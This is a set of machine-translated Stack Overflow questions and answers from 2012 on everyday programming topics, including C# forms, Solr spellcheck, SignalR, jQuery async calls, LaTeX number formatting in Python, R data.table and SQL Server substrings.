# asp.net - 在c#中更改NotifyIcon组件通知文本的背景颜色

> ID：13490268
> 
> 赞同：0
> 
> 时间：2012-11-21T09:40:05.473
> 
> 标签：asp.net, background-color, notifyicon

我在 C# 的桌面 .net 应用程序中使用 NotifyIcon。我可以更改图标，但不能更改通知文本的背景颜色。我在网上搜索，找不到任何有用的信息，或者如果有的话我跳过了。期待有关此方面的帮助。提前谢谢:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:19:16.360

Afaik 您的通知图标控件使用资源图像来显示图标，没有内置解决方案来更改背景颜色。最简单的解决方案是更改整个图标。或者就像 huMpty duMpty 提到的那样创建自己的控件，这并不容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-04T14:47:50.860

用于`alertcontrol(devexpress)`自`desktopcontrol(telrik)`定义通知外观。

# c# - 使一个表单同时移动另一个表单（C#）

> ID：13490269
> 
> 赞同：1
> 
> 时间：2012-11-21T09:40:06.070
> 
> 标签：c#, forms, drag

我有一个主窗体 Form1 和一个辅助窗体 LogForm。当 LogForm 首次出现时，它的左上角应该与 Form1 的右上角相接触。我可以做那部分。但是，如果我移动 Form1 时可以让 LogForm 保持与 Form1 接触，我也会喜欢它（即，拖动 Form1 会拖动 LogForm）。任何想法如何做到这一点？编辑：我对鼠标事件很陌生，所以如果涉及到，请彻底解释。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T03:35:49.013

最终答案；效果很好！（lf 是一个 LogForm）

```
private void Form1_Move(object sender, EventArgs e) 
{ 
    Point f1pos = self.Location; 
    Point logPos = new Point(f1pos.X + this.Width + 5, f1pos.Y + 5); 
    lf.StartPosition = FormStartPosition.Manual; 
    lf.DesktopLocation = logPos; 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T09:44:15.833

您可以使用该[`Move`事件](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.move.aspx)来处理位置更新。该事件将返回表单的新位置 - 左上角。将表单的宽度添加到此，您应该能够获得所需的位置信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T14:00:43.293

在主窗口中添加一个事件处理程序

```
 this.LocationChanged += new System.EventHandler(this.MainWindow_LocationChanged); 
```

在事件处理程序例程调用中

```
SlaveWindow.Location = new Point(this.Location.X + this.Width, this.Location.Y); 
```

来自 LocationChanged 事件处理程序

# solr - 如何不按频率对 SOLR 拼写检查建议进行排序？

> ID：13490270
> 
> 赞同：0
> 
> 时间：2012-11-21T09:40:10.073
> 
> 标签：solr, spell-checking

如果您在我的暂存索引上搜索**ahve ，您会得到****第**一个拼写检查更正，因为**它在索引中****出现**的次数比索引中的要多（我有 500 个文档被编入索引）。如果你在我的本地索引上
搜索**ahve ，你会****得到**第一个拼写检查更正，因为**have**出现的次数比索引中的任何其他单词都多。（我有 21 个文档被索引）。
这是从我的暂存索引返回的一个简单的哑巴

```
<lst name="ahve">
<int name="numFound">5</int>
<int name="startOffset">0</int>
<int name="endOffset">4</int>
<int name="origFreq">0</int>
<arr name="suggestion">
<lst>
<str name="word">the</str>
<int name="freq">112</int>
</lst>
<lst>
<str name="word">are</str>
<int name="freq">67</int>
</lst>
<lst>
<str name="word">have</str>
<int name="freq">44</int>
</lst>
<lst>
<str name="word">acne</str>
<int name="freq">10</int>
</lst>
<lst>
<str name="word">ache</str>
<int name="freq">3</int>
</lst>
</arr>
</lst> 
```

添加`spellcheck.onlyMorePopular=true`或`spellcheck.onlyMorePopular=false`不改变任何东西。
有没有办法不按出现频率对返回的建议进行排序？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T15:21:44.573

默认情况下，拼写检查结果是根据 Levenshtein 字符串距离公式然后频率或频率然后分数返回的。

您可以通过编写实现`Comparator`. 然后，将该方法的名称提供给`comparatorClass`solrconfig.xml 中的字段。

```
<lst name="spellchecker">
  <str name="name">freq</str>
  <str name="field">lowerfilt</str>
  <str name="spellcheckIndexDir">spellcheckerFreq</str>
  <!-- comparatorClass be one of:
     1\. score (default)
     2\. freq (Frequency first, then score)
     3\. A fully qualified class name
   -->
  <str name="comparatorClass">my.custom.ComparatorClass</str>
  <str name="buildOnCommit">true</str>
</lst> 
```

还有一些建议：

*   该字段`spellcheck.onlyMorePopular`不影响排序顺序。该字段检查每个建议的查询结果，*即使存在正确的建议*，也只显示查询结果最多的建议。谨慎使用。

*   `StopFilterFactory`通过在requestHandler 的索引和查询端传递数据，确保删除诸如“the”、“that”等停用词。

See: [http://wiki.apache.org/solr/SpellCheckComponent](http://wiki.apache.org/solr/SpellCheckComponent) for more information.

# php - 如何在 PHP 中将所有视频文件转换为 FLV 格式？

> ID：13490271
> 
> 赞同：0
> 
> 时间：2012-11-21T09:40:09.807
> 
> 标签：php

> **可能重复：**
> [我们如何在 php 中将视频文件转换为 .flv 格式](https://stackoverflow.com/questions/2918713/how-can-we-convert-video-files-to-flv-format-in-php)

如何使用 PHP 将任何视频文件转换为 FLV？系统要求是什么？目前我正在使用 WAMP。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:45:59.077

使用[FFMPEG](http://ffmpeg.org/)这是用于将视频从一种格式动态转换为另一种格式的标准软件。

希望这可以帮助。

# c++ - 如何在 wsfcpp 中传输大型二进制文件

> ID：13490278
> 
> 赞同：1
> 
> 时间：2012-11-21T09:40:30.157
> 
> 标签：c++, file, caching, wso2, mtom

在使用 WSFCPP 实现 Web 服务时，我在传输大型二进制文件时遇到了问题。这个问题在 WSFCPP 的网站“ [Common Attachment Configurations - File Caching](http://wso2.org/library/264) ”上得到了处理。

```
options.setProperty(Constants.Configuration.CACHE_ATTACHMENTS,
Constants.VALUE_TRUE);

options.setProperty(Constants.Configuration.ATTACHMENT_TEMP_DIR,TempDir); 
```

但是示例代码是在 java 中。如何在 C++ 中获得它？

# android - 应用程序或前台服务子类中的后台线程？

> ID：13490282
> 
> 赞同：0
> 
> 时间：2012-11-21T09:40:39.480
> 
> 标签：android, multithreading, service

我正在开发一个通过 wifi 连接从外部设备收集数据的应用程序。我使用线程来完成这项工作，并将数据存储到数据库中。

将线程放在自定义应用程序类（作为单例管理）中是个好主意吗？或者如果我把它放在前台服务中会更好吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T23:16:43.083

使用 IntentService。IntentService 使用单独的后台线程，因此不会阻塞 UI 线程。即使您的所有活动都在后台，它仍然存在。AsyncTask 的问题在于，如果 Activity 终止，它就会终止。使用 IntentService，您的下载将愉快地运行，直到完成。

如果您*确实了解*Android 线程并且您感觉很舒服，那么您可以创建自己的线程。不过，我观察到使用 IntentService 要容易得多。唯一的缺点是 IntentService 线程不能被中断，但我怀疑大多数开发人员是否需要该功能。

要从 IntentService 与应用中的其他组件进行通信，请使用 LocalBroadcastReceiver。要与 UI“交流”，请使用通知。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T09:48:20.560

您可以使用为此类内容构建的[AsyncTask 。](https://developer.android.com/reference/android/os/AsyncTask.html)它不会阻塞您的 UI 线程，并且会在后台完成您的网络和存储。

如果您需要，这里有一个教程：

[https://androidresearch.wordpress.com/2012/03/17/understanding-asynctask-once-and-forever/](https://androidresearch.wordpress.com/2012/03/17/understanding-asynctask-once-and-forever/)

# jquery - JavaScript：无法在没有警报的情况下赋值

> ID：13490284
> 
> 赞同：0
> 
> 时间：2012-11-21T09:40:47.200
> 
> 标签：jquery, json, alert, assign

我已经在 .js 文件中声明了这个函数并在 .html 文件中调用它。

```
function getTotalPages() {
    var valuePage;
    $.getJSON('Data/product.json').
        done(function(data) {
        $.each(data, function(key, value) {
                valuePage=value;
            });
        });
    //alert('out');
    return valuePage;
} 
```

上面的函数返回没有“警报”的“未定义”，带有警报它工作正常。谁可以帮我这个事。

先感谢您。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T09:43:37.767

这个问题已经回答了一千次了。这是关于“无法从异步请求中返回任何值”。你想做的所有事情都`valuePage`应该在`done`回调中完成。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T09:44:07.217

它不起作用，因为您的 ajax 请求是异步的。使用警报，您有一个超时，然后返回值。您可以通过添加使您的脚本工作（注意使用**您不能发出同步请求**`async: false` **的跨域`jsonp`**请求！）但实际上我不推荐您，因为您的 JS 将阻塞，直到请求准备好。更好的方法是使用回调：

```
function getTotalPages(callback) {
  var valuePage;
    $.getJSON('Data/product.json').
        done(function(data) {
            $.each(data, function(key, value) {
            if (typeof callback === 'function') {
                callback(value);
            }
        });
    });
} 
```

这是一个如何使用异步请求执行此操作的示例：

```
function getResult(callback) {
    var url = 'https://api.twitter.com/1/statuses/user_timeline.json?include_entities=true&include_rts=true&screen_name=mgechev&count=3';
    $.ajax({
        url: url,
        success: function (data) {
            if (typeof callback === 'function') {
                callback(data);
            }
        },
        dataType: 'jsonp'
    });
}

getResult(function (data) {
    var variable = data;
    alert(variable);
});​ 
```

JSFiddle：http: [//jsfiddle.net/vWnHJ/](http://jsfiddle.net/vWnHJ/)

在示例中，我将函数传递`getResult`给函数并使用从请求中接收到的数据调用给定函数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T09:43:58.383

AJAX 是异步的，当您关闭警报消息时，返回的值将被解析，但如果没有警报，则为时过早。您可以发出同步请求或使用回调。

# iphone - 如何读取 XML 并在标签上显示数据？

> ID：13490286
> 
> 赞同：1
> 
> 时间：2012-11-21T09:40:47.953
> 
> 标签：iphone, objective-c, xcode, ipad, ios5

我有一个 XML

```
<?xml version="1.0" encoding="UTF-8"?>
<drivers>

<driver>
<img><![CDATA[45djx96.jpg]]></img>
<name><![CDATA[Alonso]]></name>
<teamname><![CDATA[farari]]></teamname>
<ref><![CDATA[45djx96]]></ref>
</driver>

<driver>
<img><![CDATA[1236.jpg]]></img>
<name><![CDATA[Alonso2]]></name>
<teamname><![CDATA[farari2]]></teamname>
<ref><![CDATA[1236]]></ref>
</driver>

<driver>
<img><![CDATA[1245FGt.jpg]]></img>
<name><![CDATA[Alonso3]]></name>
<teamname><![CDATA[farari3]]></teamname>
<ref><![CDATA[1245FGt]]></ref>
</driver>

</drivers> 
```

我想显示唯一的细节

在 UILable 上表示 1236,s name & teamname。

我第一次使用网络服务。我成功在控制台上捕获 XML，但无法读取 XML 并在 UILable 上显示名称和团队名称的值。

现在 xml 显示在控制台上，但无法解析。

任何的想法？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:46:04.540

使用`TouchXML`您可以将这些数据解析为数组，也可以将单个记录解析为字符串，我只是发布一些关于它的代码

```
CXMLDocument *doc = [[[CXMLDocument alloc] initWithData:data options:0 error:nil] autorelease];
NSArray *nodes = [doc nodesForXPath:@"//driver" error:nil];

for (CXMLElement *node in nodes) {      
    // Create Object Of Bean Class. if required

    for(int counter = 0; counter < [node childCount]; counter++) {          
        //Save Data in The Bean Class and Add In the Array.

        if ([[[node childAtIndex:counter] name] isEqualToString:@"teamname"]) {                 
            NSString *string = [[node childAtIndex:counter] stringValue];
                            yourLable.Text = string;
            //                NSLog(@"\n\n Title %@",string);

        }
        else if ([[[node childAtIndex:counter] name] isEqualToString:@"ref"]) {                 
            NSString *string = [[node childAtIndex:counter] stringValue];
           //                NSLog(@"\n\n Ref %@",string);
        } 
} 
```

}

**对于 TouchXML，请参见本教程和示例**

1.  [触摸XML](https://github.com/TouchCode/TouchXML)

2.  [iphone-sdk-tutorial-building-an-advanced-rss-reader-using-touchxml](http://dblog.com.au/general/iphone-sdk-tutorial-building-an-advanced-rss-reader-using-touchxml-part-1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:02:29.437

对于解析，您可以使用需要以下类的 TBXML。TBXML.h、TBXML.m 和 NSDataAdditions.h、NSDataAdditions.m。

我给出了一个示例。您可以根据您的代码进行更改

```
 NSString *cStr = [NSString stringWithFormat:@"<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><SetPatientBPXMLResponse xmlns=\"http://webservice.cruxmed.com/\"><SetPatientBPXMLResult><response><state><![CDATA[45djx96.jpg]]></state></response></SetPatientBPXMLResult></SetPatientBPXMLResponse></soap:Body></soap:Envelope>"];

    TBXML *tbxmlObj = [[TBXML alloc] initWithXMLString:cStr];

    // Obtain root element
    TBXMLElement * root = tbxmlObj.rootXMLElement;
    //-------------------------------------------
    if (root)
    {
        //-------------------------------------------
        // search for the first NewDataSet element within the root element's children
        // instantiate an NewDataSet objectGetDataInXMLFromStoredProcedureResponse
        TBXMLElement * SoapBody = [TBXML childElementNamed:@"soap:Body" parentElement:root];

        TBXMLElement * SoapResponse = [TBXML childElementNamed:@"SetPatientBPXMLResponse" parentElement:SoapBody];

        TBXMLElement * SoapResult = [TBXML childElementNamed:@"SetPatientBPXMLResult" parentElement:SoapResponse];

        //TBXMLElement * NewDataSet1 = [TBXML childElementNamed:@"response" parentElement:SoapResult];

        TBXMLElement * NewDataSet = [TBXML childElementNamed:@"response" parentElement:SoapResult];
        // if an _wspGetChartTemplateByAgent element was found
        while (NewDataSet != nil) {

            //cAccountName,fOrdTotTaxDEx,fOrdTotTax,;

            // instantiate a Order object

            // find the iInvoiceId
            TBXMLElement * AutoIndex = [TBXML childElementNamed:@"state" parentElement:NewDataSet];

            if (AutoIndex != nil)
            {
                NSString* iVal=[TBXML textForElement:AutoIndex] ;
                NSLog(@"iVal:%@",iVal);
            }
            // find the next sibling element named "_wspGetChartTemplateByAgent"
            NewDataSet = [TBXML nextSiblingNamed:@"response" searchFromElement:NewDataSet];
        }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:00:03.403

好吧，我认为 NSXMLParser 类应该敲响警钟。但是，它不是那么方便，您可以找到许多更好的解析器，例如 TBXML（[分支之一](https://github.com/71squared/TBXML)）。此外，通常建议使用 JSON 而不是 XML，因为它更轻且更易于解析。最常见的 JSON 解析器库是 SBJSON。

# asp.net-mvc - 为什么从带有 SignalR 的 MVC 应用程序推送的消息无法到达客户端？

> ID：13490289
> 
> 赞同：3
> 
> 时间：2012-11-21T09:40:52.113
> 
> 标签：asp.net-mvc, azure, signalr, signalr-hub

我有一个简单的 SignalR 集线器应用程序，在服务器端使用 MVC4/C#，托管在 Azure Web 角色中（单个实例，在模拟器中，带有 http 输入端点），并且 TypeScript 在客户端编译为 JS。我有一个图片库，许多客户可能会上传到这些图片库，当有人上传时，我希望任何其他连接的客户都能收到一条消息，告诉他们这已经发生并让他们有机会刷新，类似于通知您的方式关于您在 SO 上查看的问题的新答案。

在服务器上，我有一个方法可以返回画廊中的项目列表，还有另一种方法可以将消息推送到客户端，如下所示：

```
 public virtual void PushMessage(String message)
    {
        System.Diagnostics.Debug.WriteLine("PushMessage: " + message);
        this.Clients.All.pushMessage(message);
    }

    public virtual GalleryDataResponse<T> List(String accountID, String armID, Int32 page)
    {
        GalleryDataResponse<T> response = new GalleryDataResponse<T>();
        try
        {
            IEnumerable<T> items = getAllItems(accountID, armID, page);
            if (items != null && items.Count() > 0)
            {
                response.Result = DataResponse.RESULT_DATA;
                response.Message = String.Empty;
                response.Items = items;
            }
            else
            {
                response.Result = DataResponse.RESULT_EMPTY;
                response.Message = @"There are no " + itemName + @"s in your account at the moment: " + this.Context.ConnectionId;
                response.Items = null;
            }
            this.Caller.pushMesage("HELLO, CALLER");
            PushMessage("HELLO, ALL CLIENTS");
        }
        catch (Exception ex)
        {
            response.Result = DataResponse.RESULT_ERROR;
            response.Message = ex.Message;
            response.Items = null;
        }
        return response;
    } 
```

（`List`然后在传入类型的派生类中重写该函数`T`- 这工作正常）。

在客户端，使用来自definitelyTyped 的 SignalR 定义文件，[我](https://github.com/borisyankov/DefinitelyTyped)有以下 TypeScript：

```
var that = this;
this.connection = $.hubConnection();
this.connection.logging = true;
this.connection.id = this.gServerData.CurrentAccountID + "-" +    this.gServerData.CurrentArmID;
this.connection.start().done(() => {
    that.proxy = that.connection.createProxy(that.gServerData.DataHubName);
    that.proxy.on("pushMessage", (message) => {
        console.log("PUSHED: " + message);
        debugger;
    });
    that.proxy.invoke("List", that.gServerData.CurrentAccountID, that.gServerData.CurrentArmID, 0).done((response: IGalleryDataResponse) => {
        that.handleListResponse(response);
    });
}); 
```

...它给出了以下JavaScript：

```
var that = this;
this.connection = $.hubConnection();
this.connection.logging = true;
this.connection.id = this.gServerData.CurrentAccountID + "-" + this.gServerData.CurrentArmID;
this.connection.start().done(function () {
    that.proxy = that.connection.createProxy(that.gServerData.DataHubName);
    that.proxy.on("pushMessage", function (message) {
        t.Tracer.Trace("PUSHED: " + message);
    });
    that.proxy.invoke("List", that.gServerData.CurrentAccountID, that.gServerData.CurrentArmID, 0).done(function (response) {
    that.handleListResponse(response);
    });
}); 
```

调用我的列表功能非常有效。我完全按照预期从集线器收到了回复。如果我终止服务器进程但保持浏览器处于活动状态，我会在控制台中收到错误，显示客户端正在尝试保持连接。

我将这两行添加`this.Caller.pushMesage("HELLO, CALLER"); PushMessage("HELLO, ALL CLIENTS");`到服务器端的 List 函数中，以测试服务器将内容推送到客户端。我希望它们在列表函数返回之前被调用，但这并没有发生。我也尝试过从外部调用集线器，如下所示：

```
var myHub = GlobalHost.ConnectionManager.GetHubContext<MediaGalleryHub>();
myHub.Clients.pushMessage("Hello from Global.asax"); 
```

...但是虽然我可以从跟踪中看到我的 PushMessage 函数正在被调用，但我从来没有在客户端得到任何东西。

我究竟做错了什么？

我已经尝试过的参考资料包括：

[http://blogs.msdn.com/b/brunoterkaly/archive/2012/04/09/how-to-build-cloud-based-asynchronous-scalable-web-applications-with-near-real-time-persistent-长时间运行的连接-with-signalr.aspx](http://blogs.msdn.com/b/brunoterkaly/archive/2012/04/09/how-to-build-cloud-based-asynchronous-scalable-web-applications-with-near-real-time-persistent-long-running-connections-with-signalr.aspx)

[http://msdn.microsoft.com/en-us/magazine/hh965663.aspx](http://msdn.microsoft.com/en-us/magazine/hh965663.aspx)

[https://github.com/SignalR/SignalR/wiki/Hubs](https://github.com/SignalR/SignalR/wiki/Hubs)

[https://github.com/SignalR/SignalR/wiki/SignalR-JS-Client-Hubs-%28No-Proxy%29](https://github.com/SignalR/SignalR/wiki/SignalR-JS-Client-Hubs-%28No-Proxy%29)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T09:58:18.187

这部分代码是错误的：

```
this.connection.start().done(() => {
    that.proxy = that.connection.createProxy(that.gServerData.DataHubName);
    that.proxy.on("pushMessage", (message) => {
        console.log("PUSHED: " + message);
        debugger;
    });
    that.proxy.invoke("List", that.gServerData.CurrentAccountID, that.gServerData.CurrentArmID, 0).done((response: IGalleryDataResponse) => {
        that.handleListResponse(response);
    });
}); 
```

您需要在调用 start 之前订阅：

```
that.proxy = that.connection.createProxy(that.gServerData.DataHubName);
that.proxy.on("pushMessage", (message) => {
    console.log("PUSHED: " + message);
    debugger;
});    

this.connection.start().done(() => {
    that.proxy.invoke("List", that.gServerData.CurrentAccountID, that.gServerData.CurrentArmID, 0).done((response: IGalleryDataResponse) => {
        that.handleListResponse(response);
    });
}); 
```

# python - 在 Python 中使用 LaTeX 表示法格式化数字

> ID：13490292
> 
> 赞同：13
> 
> 时间：2012-11-21T09:41:10.527
> 
> 标签：python, formatting, latex

在 Python 中使用格式字符串我可以轻松地以“科学记数法”打印一个数字，例如

```
>> print '%g'%1e9
1e+09 
```

以 LaTeX 格式格式化数字的最简单方法是什么，即 1\times10^{+09}？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-11-21T09:57:06.377

siunitx LaTeX 包为您解决了这个[问题](http://ctan.org/pkg/siunitx)，它允许您直接使用 python 浮点值，而无需解析结果字符串并将其转换为有效的 LaTeX。

```
>>> print "\\num{{{0:.2g}}}".format(1e9)
\num{1e+09} 
```

当 LaTeX 文档编译后，上面的代码会变成 ![在此处输入图像描述](../Images/44fff907fb2616a5e3df5fb59042d386.png). 正如 andybuckley 在评论中指出的那样，加号可能不被 siunitx 接受（我没有测试过），所以可能有必要对`.repace("+", "")`结果做 a 。

如果 using`siunitx`不知何故，请编写如下自定义函数：

```
def latex_float(f):
    float_str = "{0:.2g}".format(f)
    if "e" in float_str:
        base, exponent = float_str.split("e")
        return r"{0} \times 10^{{{1}}}".format(base, int(exponent))
    else:
        return float_str 
```

测试：

```
>>> latex_float(1e9)
'1 \\times 10^{9}' 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-21T10:04:02.740

你可以写一个`frexp10`函数：

```
def frexp10(x):
    exp = int(math.floor(math.log10(abs(x))))
    return x / 10**exp, exp 
```

然后以 LaTeX 样式格式化：

```
'{0}^{{{1:+03}}}'.format(*frexp10(-1.234e9)) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-02-06T15:44:33.077

安装[num2tex](https://github.com/AndrewChap/num2tex)：

```
pip install num2tex 
```

并这样使用它：

```
>>> from num2tex import num2tex
>>> '{:.0e}'.format(num2tex(1e9))
'1 \\times 10^{9}' 
```

`num2tex`继承自，`str`因此`format`可以以相同的方式使用该函数。

您还可以使用更改指数的格式`num2tex.configure()`（添加此以响应@Matt 的评论）。

```
>>>from num2tex import num2tex
>>>from num2tex import configure as num2tex_configure
>>>num2tex_configure(exp_format='cdot')
>>>num2tex(1.3489e17)
'1.3489 \cdot 10^{17}'
>>>num2tex_configure(exp_format='parentheses')
'1.3489 (10^{17})' 
```

截至目前，这在 GitHub 中没有记录，我会尽快尝试更改它！

免责声明：在使用（并支持）[Lauritz V. Thaulow 的答案](https://stackoverflow.com/questions/13490292/format-number-using-latex-notation-in-python/13490601#13490601)一段时间后（对于 Jupyter、Matplotlib 等），我认为编写一个简单的 Python 模块对我的工作流程会更好，所以我在[GitHub 上](https://github.com/AndrewChap/num2tex)创建了 num2tex并在[派皮](https://pypi.org/project/num2tex/)。我很想得到一些关于如何使它更有用的反馈。

# r - 将列添加到 R 中的空 data.table

> ID：13490299
> 
> 赞同：26
> 
> 时间：2012-11-21T09:41:36.887
> 
> 标签：r, data.table

要向现有的空*data.table*（*版本 1.8.6*）添加新列，似乎没有办法在没有被警告的情况下做到这一点。

例子：

```
dt<-old.table[0]
dt[,new_column:=""] 
```

这会产生警告：

```
In '[.data.table'(dt, , ':='(new_column,"")):    
Supplied 1 items to be assigned to 0 items of column 'new_column' (1 unused) 
```

有没有办法在没有警告的情况下添加新列？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-11-21T10:08:09.560

好问题。分配一个空字符向量 ( `character()`) 而不是长度为 1 的字符向量 ( `""`)。

```
> DT = data.table(a=1:3,b=4:6)
> DT2 = DT[0]
> DT2
Empty data.table (0 rows) of 2 cols: a,b
> DT2[,newcol:=character()]    # no warning
> DT2
Empty data.table (0 rows) of 3 cols: a,b,newcol
> sapply(DT2,class)
          a           b      newcol 
  "integer"   "integer" "character" 
```

顺便说一句，`""[0]`是另一种创建长度为 0 的字符向量的方法；`character()`根据您的喜好，打字比打字少 7 个字符，但可读性可能较差。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-05-29T14:43:56.753

就像添加一个空字符列一样，当`data.table`具有任意数量的行（包括 0）时：

```
DT2[ ,newcol:=character(.N) ] 
```

# sql-server-2008 - 如何在 SQL Server 2008 中对字符串值进行子串化

> ID：13490301
> 
> 赞同：7
> 
> 时间：2012-11-21T09:41:43.550
> 
> 标签：sql-server-2008

我有以下字符串

```
KLPI_2012_CBBE2_E_12704_2012-09-21_13_59_52
IYT_2012_CBBI1_S_66_2012-09-21_15_28_53 
```

我想在 1 号`_`之后和 5 号之前提取所有内容`_`

前任：

```
2012_CBBE2_E_12704 
2012_CBBI1_S_66 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-21T18:42:36.750

### 方法 1\. 嵌套 CHARINDEX 调用。

用于获取 中第一个的位置。如果您将该位置作为第三个参数传递，您可以指示从某个位置开始搜索：`CHARINDEX('_', *stringvalue*)``_`*`stringvalue`*`CHARINDEX`

```
CHARINDEX(`_`, *stringvalue*, *startpos*) 
```

现在，如果起始位置将是 的结果，即像这样：`CHARINDEX('_', *stringvalue*)+1`

```
CHARINDEX(`_`, *stringvalue*, CHARINDEX(`_`, *stringvalue*) + 1) 
```

那么这会给你第二个`_`的位置。因此，要找到第五个`_`，您需要再嵌套`CHARINDEX`三次：

```
WITH aTable AS (
  SELECT
    *
  FROM
    (VALUES
      ('KLPI_2012_CBBE2_E_12704_2012-09-21_13_59_52'),
      ('IYT_2012_CBBI1_S_66_2012-09-21_15_28_53')
    ) AS v (aStringColumn)
),
positions AS (
  SELECT
    aStringColumn,
    Underscore1 = CHARINDEX('_', aStringColumn),
    Underscore5 = CHARINDEX('_',
                            aStringColumn,
                            CHARINDEX('_',
                                      aStringColumn,
                                      CHARINDEX('_',
                                                aStringColumn,
                                                CHARINDEX('_',
                                                          aStringColumn,
                                                          CHARINDEX('_',
                                                                    aStringColumn
                                                                   ) + 1
                                                         ) + 1
                                               ) + 1
                                     ) + 1
                           )
  FROM
    aTable
)
SELECT
  aSubstring = SUBSTRING(aStringColumn,
                         Underscore1 + 1,
                         Underscore5 - Underscore1 - 1
                        )
FROM
  positions
; 
```

### 方法二、人物分割+排名。

1.  使用[数字表](https://stackoverflow.com/questions/10819/sql-auxiliary-table-of-numbers "SQL，数字辅助表")将每个字符串拆分为单个字符，沿途拉动它们的位置。

2.  对字符串中每个字符的出现进行排名。

3.  获取两个子集：

    1）人物`_`和排名为1；

    2) 具有5的角色`_`和排名。

    将这些子集相互连接。

4.  与方法1类似，使用`_`#1和#5的对应位置来获取子字符串。`_`

```
WITH aTable AS (
  SELECT
    *
  FROM
    (VALUES
      ('KLPI_2012_CBBE2_E_12704_2012-09-21_13_59_52'),
      ('IYT_2012_CBBI1_S_66_2012-09-21_15_28_53')
    ) AS v (aStringColumn)
),
split AS (
  SELECT
    t.aStringColumn,
    aChar    = SUBSTRING(t.aStringColumn, n.Number, 1),
    Position = n.Number
  FROM
    aTable t
    INNER JOIN Numbers n
      ON n.Number BETWEEN 1 AND LEN(t.aStringColumn)
),
ranked AS (
  SELECT
    *,
    rnk = ROW_NUMBER() OVER (PARTITION BY aStringColumn, aChar ORDER BY Position)
  FROM
    split
  WHERE
    aChar = '_'
)
SELECT
  aSubstring = SUBSTRING(first.aStringColumn,
                         first.Position + 1,
                         fifth.Position - first.Position - 1
                        )
FROM
  ranked first
  INNER JOIN ranked fifth
    ON first.aStringColumn = fifth.aStringColumn
WHERE
  first.rnk = 1
  AND fifth.rnk = 5
; 
```

* * *

注意：这两种方法都假定每个`aStringColumn`值都至少有 5 个下划线字符。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-21T09:44:57.777

您可以使用[SUBSTRING](http://msdn.microsoft.com/en-us/library/ms187748.aspx)函数从给定字符串中提取子字符串。

```
SELECT SUBSTRING('KLPI_2012_CBBE2_E_12704_2012-09-21_13_59_52', 6, 18); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T09:47:13.633

它被巧妙地命名为 SubString

如在

```
Select Substring('KLPI_2012_CBBE2_E_12704_2012-09-21_13_59_52',6,18) 
```

如果您想在字符串中找到它，那么 CharIndex 会很有用。您确定要在 SQL 中执行此操作吗，它会变得混乱且缓慢，您需要创建一个 UDF，或者使用 CLR 来真正使用它。

# javascript - 如何查看 console.log() 的输出？

> ID：13490302
> 
> 赞同：6
> 
> 时间：2012-11-21T09:41:44.180
> 
> 标签：javascript

我正在使用这段代码：

```
<script type = "text/javascript">
 console.log("hello world");
</script> 
```

我怎样才能看到的输出`console.log()`？

我在谷歌上搜索但没有找到解决方案。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T09:43:24.933

您可以打开错误控制台，具体取决于您的浏览器。（例如，Firefox 中的 Ctrl+Shift+J 或 Chrome 中的 F12）。大多数浏览器都将控制台隐藏在其开发人员工具中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-21T09:45:37.767

该 `console.log();`语句在浏览器控制台中打印任何内容。

在所有主要浏览器中查找`Developer Tools`或简单`Tools`菜单。

如果您使用的是 Google Chrome，请按`Cntrl+shift+j`查看控制台。

在 Firefox 中，按下`Ctrl+Shift+I`并单击控制台以查看 Firefox 上的控制台。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-21T09:54:37.643

您需要在控制台中查看结果。打开控制台。

另外，您的代码有问题。

```
<script type = "text/javascript">
console.log("hello world");
</script> 
```

无效。删除脚本标签中的空格，如下所示：

```
<script type="text/javascript">
console.log("hello world");
</script> 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-21T09:42:54.377

在谷歌浏览器中按 F12 并单击控制台以查看输出

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-21T09:43:58.917

1.  打开火狐

2.  转到工具，然后附加组件。

3.  搜索并安装名为“firebug”的附加组件

4.  在重新加载页面之前打开 firebug 并转到控制台选项卡。
    你会看到你想要的结果。如果你有铬，那么它已经在那里了。就用它

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-11-21T09:45:31.307

要查看在各种浏览器中使用控制台的不同方式，请参阅本文：

*   [如何在不同浏览器中打开 JavaScript 控制台](https://webmasters.stackexchange.com/questions/8525/how-to-open-the-javascript-console-in-different-browsers)

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-11-21T09:48:05.780

首先，`console.log()`您的 .. 中无法输出 javascript

你需要 javascript 控制台来输出它

第一的

按 F12 然后单击控制台标签

